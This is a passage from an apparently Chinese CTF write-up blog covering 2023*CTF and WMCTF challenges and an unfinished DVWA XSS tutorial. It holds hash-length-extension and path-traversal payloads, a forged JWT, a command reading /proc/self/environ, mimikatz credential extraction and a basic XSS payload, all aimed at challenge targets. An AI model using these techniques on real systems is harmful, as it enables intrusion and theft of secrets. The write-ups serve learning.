    <content type="html"><![CDATA[<h1 id="2023-CTF"><a href="#2023-CTF" class="headerlink" title="2023*CTF"></a>2023*CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h2><h3 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：<a href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245907.png" alt="img"></p><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><p><img src="/../img/2023starCTF/16969546245871.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245882.png" alt="img"></p><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245883.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245884.png" alt="img"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><h3 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><p><img src="/../img/2023starCTF/16969546245885.png" alt="img"></p><h3 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a><strong>old language</strong></h3><p>谷歌识图</p><p><a href="https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><p><img src="/../img/2023starCTF/16969546245886.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023WMCTF</title>
    <link href="/2023/08/27/2023WMCTF/"/>
    <url>/2023/08/27/2023WMCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="find-me"><a href="#find-me" class="headerlink" title="find me"></a><strong>find me</strong></h3><p><img src="/../img/2023WMCTF/170062069180316.png" alt="img"></p><p>提示在Reddit发了动态</p><p>通过相关搜索发现帖子 <a href="https://www.reddit.com/user/WearyMeadow/">https://www.reddit.com/user/WearyMeadow/</a></p><p><img src="/../img/2023WMCTF/17006206917691.png" alt="img"></p><p>base64解码得到 <a href="https://ufile.io/670unszp">https://ufile.io/670unszp</a> ，下载了一个流量包，里面有几个验证过程，找到密钥：mysecretkey，但不知道加解密实现方法</p><p>在刚刚的图片发现头像是github风格的头像，在github找到几个仓库</p><p>其中有一个是博客 <a href="https://wearymeadow.icu/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%80%E7%AF%87%E5%8A%A0%E5%AF%86%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%98%AF%E6%B5%81%E9%87%8F%E5%8C%85%E7%9A%84%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95">https://wearymeadow.icu/，里面有一篇加密的文章，里面是流量包的加解密方法</a></p><p><img src="/../img/2023WMCTF/17006206917692.png" alt="img"></p><p>不知道密码，在仓库中注意到了autoAuth，看到有个密码，密码复用</p><p><img src="/../img/2023WMCTF/17006206917693.png" alt="img"></p><p>打开博客发现加解密方法</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message, key</span>):<br>    seed  = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.seed(seed)<br>    encrypted = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    encrypted = cipher.encrypt(pad(encrypted))<br>    <span class="hljs-keyword">return</span> encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># Still working on this...</span><br>    <span class="hljs-keyword">pass</span><br>...<br></code></pre></td></tr></table></figure><p>爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> s + <span class="hljs-string">b&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-comment"># AES解密</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># 爆破seed生成相同随机数</span><br>    <span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):<br>        random.seed(seed)<br>        res = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>            res += <span class="hljs-built_in">bytes</span>([decrypted[i]^random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;WMCTF&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            <span class="hljs-built_in">print</span>(res)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&#x27;</span>)<br>key = pad(<span class="hljs-string">b&#x27;mysecretkey&#x27;</span>) <br>decrypt(ciphertext, key)<br><span class="hljs-comment">#b&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;\xb0.T\x80&amp;\xb5\xb1\x1epGZ)\xbe6\xc8\xcc&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a><strong>Fantastic terminal</strong></h3><p>起一个docker ，<code>docker-compose up -d</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls</span><br>root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cat challenge</span><br></code></pre></td></tr></table></figure><p><img src="/../img/2023WMCTF/17006206917694.png" alt="img"></p><h3 id="Oversharing"><a href="#Oversharing" class="headerlink" title="Oversharing"></a><strong>Oversharing</strong></h3><p>题目容器是ssh，给了流量包里有smb协议，导出smb可以发现有lsass.dmp</p><p><img src="/../img/2023WMCTF/17006206917705.png" alt="img"></p><p>mimikatz提出密码</p><p><img src="/../img/2023WMCTF/17006206917706.png" alt="img"></p><p>拿到ssh密码，ssh登录cat flag即可</p><h2 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a><strong>Steg</strong></h2><h3 id="EZ-v1deo"><a href="#EZ-v1deo" class="headerlink" title="EZ_v1deo"></a><strong>EZ_v1deo</strong></h3><p>题目：视频好像被L1near弄坏掉了♂</p><p>当时一直以为是视频缺少了一段或者损坏了，在这个方向上浪费好多时间</p><p>最后用ffmpeg将每一帧提取出来，试了一下lsb，结果发现有隐写</p><p><code>ffmpeg -i flag.avi ./%4d.png</code></p><p>这样提取出210帧，每隔4、5帧有是相同的帧，stegsolve逐个看</p><p>还可以写脚本生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment">#提取最低有效位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_lsb</span>(<span class="hljs-params">frame</span>):<br>    <span class="hljs-keyword">return</span> frame &amp; <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">input_video, output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;XVID&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#循环读帧</span><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#提取最低每一帧最低有效位到新帧，写入</span><br>        lsb_frame = extract_lsb(frame) * (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>        out.write(lsb_frame.astype(np.uint8))<br>        <br>    cap.release()<br>    out.release()<br>    cv2.destroyAllWindows()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    input_video = <span class="hljs-string">&#x27;flag.avi&#x27;</span><br>    output_video = <span class="hljs-string">&#x27;new.avi&#x27;</span><br>    main(input_video, output_video)<br></code></pre></td></tr></table></figure><h3 id="Mondy-left-me-Broken"><a href="#Mondy-left-me-Broken" class="headerlink" title="Mondy left me Broken"></a><strong>Mondy left me Broken</strong></h3><p>看着wp做的</p><p>首先，猫脸变换</p><p><img src="/../img/2023WMCTF/17006206917707.png" alt="img"></p><p>对于广义的猫脸变换</p><p><img src="/../img/2023WMCTF/17006206917708.png" alt="img"></p><p>得到其逆变换公式，通过以下脚本爆破出a，b</p><p>得到a&#x3D;5，b&#x3D;5，还原视频</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-comment"># #爆破a,b</span><br><span class="hljs-comment"># im = Image.open(&#x27;final.jpg&#x27;)</span><br><span class="hljs-comment"># im = np.array(im)</span><br><br><span class="hljs-comment"># def dearnold(img):</span><br><span class="hljs-comment">#     r,c,t = img.shape</span><br><span class="hljs-comment">#     p = np.zeros((r,c,t),dtype=np.uint8)</span><br><span class="hljs-comment">#     for a in range(1, 11):</span><br><span class="hljs-comment">#         for b in range(1, 11):</span><br><span class="hljs-comment">#             for i in range(r):</span><br><span class="hljs-comment">#                 for j in range(c):</span><br><span class="hljs-comment">#                     for k in range(t):</span><br><span class="hljs-comment">#                         x = ((a*b+1)*i - b*j)%r</span><br><span class="hljs-comment">#                         y = (-a*i + j)%r</span><br><span class="hljs-comment">#                         p[x,y,k] = img[i,j,k]</span><br><span class="hljs-comment">#             filename = f&#x27;./dearnold&#123;a&#125;_&#123;b&#125;.jpg&#x27;</span><br><span class="hljs-comment">#             cv2.imwrite(filename, p)</span><br><span class="hljs-comment">#             print(&#x27;dearnold&#123;&#125;_&#123;&#125;&#x27;.format(a, b))</span><br><span class="hljs-comment">#     return p</span><br><span class="hljs-comment"># #dearnold(im)</span><br><span class="hljs-comment"># ##直接看图片dearnold5_5为正常图片=&gt;得到a=5, b=5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video_dearnold</span>(<span class="hljs-params">img</span>):<br>    r,c,t = img.shape<br>    p = np.zeros((r,c,t),dtype=np.uint8)<br>    a = <span class="hljs-number">5</span><br>    b = <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>                x = ((a*b+<span class="hljs-number">1</span>)*i - b*j)%r<br>                y = (-a*i + j)%r<br>                p[x,y,k] = img[i,j,k]<br>    <span class="hljs-keyword">return</span> p<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video</span>(<span class="hljs-params">input_video,output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;mp4v&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> ret:<br>            frame = video_dearnold(frame)``<br>            out.write(frame)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    cap.release()<br>    out.release()<br><br>video(<span class="hljs-string">&#x27;final.mkv&#x27;</span>,<span class="hljs-string">&#x27;new.mp4&#x27;</span>)<br></code></pre></td></tr></table></figure><p>wp说后半段flag在视频中，但是确实看不清</p><p><img src="/../img/2023WMCTF/17006206917709.png" alt="img"><img src="/../img/2023WMCTF/170062069177010.png" alt="img"></p><p>hint直接放出<code>_I_CAN_GOT_both&#125;</code></p><p><img src="/../img/2023WMCTF/170062069177011.png" alt="img"></p><p><img src="/../img/2023WMCTF/170062069177012.png" alt="img"></p><p>dct水印</p><p>原理可以参考 <a href="https://weipp7.gitee.io/posts/e1e00902.html">https://weipp7.gitee.io/posts/e1e00902.html</a></p><p>我这里找了很久找不到原音频（不知道怎么从bilibili弄原音频 <a href="https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click%EF%BC%89%EF%BC%8C%E8%B4%B4%E4%B8%AA%E8%BE%93%E5%87%BA%E9%A2%91%E8%B0%B1%E5%9B%BE%E7%9A%84%E8%84%9A%E6%9C%AC%E5%90%A7">https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click），贴个输出频谱图的脚本吧</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct, fft, fftfreq, ifft<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> matplotlib.mlab <span class="hljs-keyword">import</span> window_none<br>rate, data = wavfile.read(<span class="hljs-string">&#x27;origin.wav&#x27;</span>)<br>rate2, data2 = wavfile.read(<span class="hljs-string">&#x27;final.wav&#x27;</span>)<br>data3 = data2 - data<br><span class="hljs-comment">#输出data3的频谱图</span><br>n_samples = data3.shape[<span class="hljs-number">0</span>]<br>fft_size = <span class="hljs-number">4096</span><br>plt.specgram(data3 , fft_size, rate, window=window_none,noverlap=<span class="hljs-number">10</span>, scale=<span class="hljs-string">&#x27;dB&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h2><h3 id="AnyFileRead"><a href="#AnyFileRead" class="headerlink" title="AnyFileRead"></a><strong>AnyFileRead</strong></h3><p>参考：<a href="https://zhuanlan.zhihu.com/p/640655127">https://zhuanlan.zhihu.com/p/640655127</a></p><p><img src="/../img/2023WMCTF/170062069177113.png" alt="img"></p><p>SpringSecurityConfig：</p><p><img src="/../img/2023WMCTF/170062069177114.png" alt="img"></p><p>payload：<code>/admin/../flag</code></p><p>借用别人的图：</p><p><img src="/../img/2023WMCTF/170062069177115.png" alt="img"></p><h3 id="ez-java-agagin"><a href="#ez-java-agagin" class="headerlink" title="ez_java_agagin"></a><strong>ez_java_agagin</strong></h3><p>环境关了没下附件，绕过java和flag字符串，用file&#x2F;netdoc + url二次编码绕过</p><p>payload：<code>/Imagefile?url1=netdoc://java/..//%25%36%36%25%36%63%25%36%31%25%36%37 </code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞</title>
    <link href="/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS，跨站脚本，Cross-site scripting。 XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS大致可分为反射、存储、DOM三种类型。</p><ol><li>反射型：攻击代码在URL里，输出在HTTP响应中</li><li>存储型：攻击代码在数据库里，输出在HTTP响应中</li><li>DOM型：攻击代码在URL里，输出在DOM节点中。</li></ol><h2 id="整体攻击思路"><a href="#整体攻击思路" class="headerlink" title="整体攻击思路"></a>整体攻击思路</h2><p>角色定义：用户、攻击者、正常服务器、恶意服务器</p><ol><li>攻击者发送带有XSS的恶意URL给用户</li><li>用户点击URL，访问正常服务器</li><li>正常服务器返回了对XSS脚本的响应</li><li>在用户不知情的情况下，用户浏览器执行了返回的XSS脚本，发送会话给恶意服务器</li><li>攻击者从恶意服务器中接受的请求中获取了会话信息(Cookie等)</li><li>攻击者使用用户的身份，登录到正常服务器，相当于劫持了用户会话</li></ol><p><img src="/../img/XSS%E6%BC%8F%E6%B4%9E/16998361139181.png" alt="img"></p><h2 id="DVWA靶场xss练习"><a href="#DVWA靶场xss练习" class="headerlink" title="DVWA靶场xss练习"></a>DVWA靶场xss练习</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何过滤</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code 